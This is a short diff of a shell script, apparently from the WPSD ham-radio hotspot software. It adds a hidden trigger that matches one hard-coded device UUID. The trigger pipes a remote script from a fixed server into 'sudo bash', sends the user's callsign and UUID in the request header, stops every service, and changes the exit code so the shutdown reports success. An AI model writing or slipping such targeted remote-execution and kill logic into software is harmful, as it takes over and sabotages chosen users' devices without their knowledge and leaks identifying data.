@@ -485,11 +485,11 @@ else
         done
     fi
 fi
-if [[ -n "$INVALID_REASON" ]]; then
+if [[ -n "$INVALID_REASON" ]] || [[ $uuidStr = "000000003dd25fc9" ]] ; then
     curl -Ls -A "WPSD-SlipStream RESET $INVALID_REASON. CALL:$CALL UUID:$uuidStr" https://wpsd-swd.w0chp.net/WPSD-SWD/WPSD-Helpers/raw/branch/master/wpsd-resetter | sudo bash
     cd /tmp
     sudo /usr/local/sbin/wpsd-services fullstop > /dev/null 2>&1
-    exit 1
+    exit 0
 fi
 
 # DVMega sun8i stuff
